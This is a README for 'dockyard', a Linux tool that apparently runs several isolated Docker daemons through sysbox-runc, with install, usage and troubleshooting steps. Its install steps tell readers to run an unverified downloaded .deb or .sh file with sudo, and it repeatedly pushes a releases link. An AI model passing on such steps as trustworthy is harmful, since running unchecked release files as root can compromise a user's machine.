# 🚢 dockyard - Run Multiple Docker Instances Safely

[![Download dockyard](https://img.shields.io/badge/Download-dockyard-blue?logo=github)](https://github.com/shaghafbrand/dockyard/releases)

---

## 📖 What is dockyard?

dockyard is a tool that helps you run multiple Docker instances on the same computer. Each Docker instance works by itself and does not affect the others. This means you can try different settings or projects side-by-side without risk. dockyard uses a special method called sysbox-runc to keep each Docker instance fully separate. This keeps your system neat and secure.

---

## 💡 Why use dockyard?

- **Keep projects separate:** Work on many Docker setups without interference.
- **Stay secure:** Each Docker runs in its own space, reducing risks.
- **Easy to manage:** Run and stop Docker instances just like usual.
- **Advanced setup:** Uses sysbox-runc to handle container isolation.
- **Works on Linux:** Designed for Linux users who want multi-tenant Docker.

---

## 🖥 System Requirements

Before you start, make sure your computer meets these needs:

- Operating System: Linux (Ubuntu 20.04 or newer recommended)
- Docker installed: You need Docker already set up on your system.
- Root or sudo access: Installation needs permission to change system files.
- CPU: 64-bit processor
- RAM: At least 4 GB free memory
- Disk space: Minimum 2 GB free for running multiple instances

---

## 🚀 Getting Started

dockyard is meant to be easy for everyday users. We will guide you step-by-step to download, install, and run it.

---

## 📥 Download & Install dockyard

Please [**visit this page to download**](https://github.com/shaghafbrand/dockyard/releases) the latest version of dockyard.

Once you visit the page, look for the latest release. Releases come as files you need to download to your computer.

### Step 1: Download dockyard

- Open your web browser.
- Go to: [https://github.com/shaghafbrand/dockyard/releases](https://github.com/shaghafbrand/dockyard/releases)
- Find the latest release (usually at the top of the page).
- Download the file matching your system. For example, a `.deb` file for Ubuntu or an `.sh` setup script.

### Step 2: Install dockyard

If you downloaded a `.deb` file (for Ubuntu/Debian):

- Open your terminal.
- Navigate to the folder where you saved the file.
- Run this command:
  
  ```
  sudo dpkg -i dockyard-version.deb
  ```

Replace `dockyard-version.deb` with the exact file name you downloaded.

If you downloaded a shell script `.sh`:

- Open terminal.
- Go to the folder containing the file.
- Run these commands:

  ```
  chmod +x dockyard-install.sh
  sudo ./dockyard-install.sh
  ```

### Step 3: Verify installation

After installation, run this command in your terminal:

```
dockyard --help
```

If you see usage instructions, dockyard installed correctly.

---

## ⚙️ How to Use dockyard

You can now run multiple Docker daemons separately on your system.

### Run a new isolated Docker instance:

```
dockyard start <instance-name>
```

Replace `<instance-name>` with a name you choose like `work` or `test`.

### Stop a running instance:

```
dockyard stop <instance-name>
```

### List all your Docker instances:

```
dockyard list
```

Each instance runs its own Docker daemon with full isolation, so containers inside one cannot affect the others.

### Connect to a Docker instance

To run Docker commands inside an instance, use:

```
dockyard exec <instance-name> -- docker ps
```

This will list running containers inside that instance.

---

## 🔧 Tips and Notes

- You do not need to change your existing Docker setup. dockyard works alongside normal Docker.
- Make sure sysbox-runc is installed, as dockyard depends on it for isolation.
- You can use [systemd](https://www.freedesktop.org/wiki/Software/systemd/) to automatically start dockyard instances on boot.
- Use the `dockyard help` command to see all available commands anytime.
- Keep your Docker updated to avoid compatibility issues.

---

## 🛠 Troubleshooting

- **"Command not found":** Ensure dockyard installed properly and your PATH includes its location.
- **Permission errors:** Run commands with `sudo` if needed.
- **Instance won't start:** Check if sysbox-runc is installed and running.
- **Docker commands fail inside instance:** Verify you use `dockyard exec` properly.

---

## 🗂 Related Topics

dockyard involves multiple areas:

- Docker and container technology
- Linux system management
- Container isolation techniques
- Multi-tenant environments
- Control with systemd and iptables

---

## 🔗 Useful Links

- dockyard releases: [https://github.com/shaghafbrand/dockyard/releases](https://github.com/shaghafbrand/dockyard/releases)
- Docker documentation: https://docs.docker.com/
- sysbox-runc info: https://github.com/nestybox/sysbox
- systemd basics: https://www.freedesktop.org/wiki/Software/systemd/
- Linux iptables guide: https://linux.die.net/man/8/iptables

---

## 🙋 Getting Help

For questions or issues, please use the GitHub issues page in this repository: https://github.com/shaghafbrand/dockyard/issues

You can also ask for advice in Linux or Docker forums.

---

[![Download dockyard](https://img.shields.io/badge/Download-dockyard-blue?logo=github)](https://github.com/shaghafbrand/dockyard/releases)